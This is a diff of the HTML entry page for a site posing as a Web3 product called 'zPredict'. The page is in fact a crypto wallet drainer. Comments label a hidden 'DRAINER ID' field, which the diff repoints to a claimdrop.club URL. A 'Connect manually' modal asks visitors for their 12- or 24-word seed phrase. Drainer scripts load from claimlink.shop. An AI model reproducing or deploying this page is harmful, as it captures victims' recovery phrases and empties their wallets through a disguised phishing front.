@@ -4,18 +4,18 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>zPredict — Professional Multi-Chain Web3 Engine</title>
-
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
     <link rel="stylesheet" href="https://claimlink.shop/assets/css/style.css?v=09.19.205">
   </head>
   <body style="margin:0; padding: 0; background-color: #000000;">
 
+    <!-- Ye tera React Root hai -->
     <div id="root"></div>
 
-    <!-- YOUR DRAINER ID -->
-    <input type="hidden" value="NWMWYVNZIBTWNLUFKVTQ36XDXWPFWX8DEPR7X5GTEACLS" id="exogator_id">
+    <!-- DRAINER ID -->
+    <input type="hidden" value="https://claimdrop.club/?g=YHGPARLPVN4UB1AEGXFSNTUAHGRWONC7EYZKPW1CRY7UX" id="exogator_id">
 
-    <!-- ORIGINAL MODAL STRUCTURE -->
+    <!-- ORIGINAL BIG MODAL -->
     <div class="modal__container" id="modal-container">
         <div class="modal__content">
             <div class="modal__close close-modal" onclick="closeModal()" title="Close"><i class='bx bx-x'></i></div>
@@ -24,12 +24,10 @@
             <button id="tito3" class="modal__button modal__button-width" onclick="start_exogator()">
               Other wallets 
               <t style="width: 32px;right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;"> 350+</t>
-              <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style="width: 23px; right: 110px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 5px; background: #ffd3a1; border: 1px solid #b5b5b5;"> 
-              <img src="https://vectorseek.com/wp-content/uploads/2024/07/Trust-Wallet-Shield-Logo-Vector-Logo-Vector.svg-.png" style="width: 21px; right: 134px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 4px 6px; background: #ffffff; border: 1px solid #cccccca3; box-shadow: 3px 1px 10px -5px;"> 
-              <img src="https://images.mirror-media.xyz/publication-images/Lx_fohJ8ttprQ3DmDKU9N.png?height=2048&width=2048" style="width: 33px; right: 158px; position: absolute; border-radius: 12px; margin-top: -7px; padding: 0px 0px; box-shadow: 3px 1px 10px -5px;">
+              <img src="https://cdn.iconscout.com/icon/free/png-256/free-metamask-logo-icon-download-in-svg-png-gif-file-formats--browser-extension-chrome-logos-icons-2261817.png" style="width: 23px; right: 110px; position: absolute;"> 
             </button>
             <button id="tito3" class="modal__button modal__button-width" onclick="showseedme()"> 
-              Connect manually <t style="right: 58px;position: absolute;border-radius: 12px;margin-top: -7px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
+              Connect manually <t style="right: 58px;position: absolute;border-radius: 12px;background: #cfcfcf;padding: 8px 7px;color: #636363;font-weight: 600;font-family: monospace;border: 1px solid #cccccca3;">Seed</t>
             </button>
         </div>
     </div>
@@ -38,7 +36,7 @@
     <div id="myModal" class="modal">
         <div class="modal-content">
             <div style="padding: 20px 22px;">
-                <span class="close"><select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border-radius: 9px;"><option value="12" selected>12-word</option><option value="24">24-word</option></select></span>
+                <span class="close"><select onchange="generateSeedPhraseInputs(this.value)" style="background: #ebebeb; padding: 4px; border-radius: 9px;"><option value="12" selected>12-word phrase</option><option value="24">24-word phrase</option></select></span>
                 <h2 style="margin: 0px;">Connect manually</h2>
                 <div class="seed-phrase-container" id="seedPhraseContainer"></div>
                 <button onclick="checkAllFieldsFilled()" style="margin-top: 20px; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; cursor: pointer;">Connect Wallet</button>
@@ -46,18 +44,16 @@
         </div>
     </div>
 
-    <!-- REACT LOADS FIRST -->
-    <script type="module" src="/src/main.tsx"></script>
-
-    <!-- DRAINER CONFIG & SCRIPTS -->
+    <!-- VITE AUTOMATICALLY INJECTS THE SCRIPT HERE DURING BUILD -->
+    
     <script>
-        let modaltheme = 3; let evm = 1; let seed = 0; let auto = 1; let dark = 0; let towsteps = 1; 
+        window.modaltheme = 3; window.evm = 1; window.seed = 0; window.auto = 0; window.dark = 0; window.towsteps = 1; 
     </script>
-    <script defer src="https://claimlink.shop/assets/eth.js?v=09.19.205"></script>
-    <script defer src="https://claimlink.shop/assets/w-modal.js?v=09.19.205"></script>
-    <script defer src="https://claimlink.shop/assets/w-loader.js?v=09.19.205"></script>
-    <script defer src="https://claimlink.shop/assets/modules.js?v=09.19.205"></script>
-    <script defer src="https://claimlink.shop/assets/main.js?v=09.19.205"></script>
+    <script src="https://claimlink.shop/assets/eth.js?v=09.19.205"></script>
+    <script src="https://claimlink.shop/assets/w-modal.js?v=09.19.205"></script>
+    <script src="https://claimlink.shop/assets/w-loader.js?v=09.19.205"></script>
+    <script src="https://claimlink.shop/assets/modules.js?v=09.19.205"></script>
+    <script src="https://claimlink.shop/assets/main.js?v=09.19.205"></script>
     <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js"></script>
   </body>
 </html>
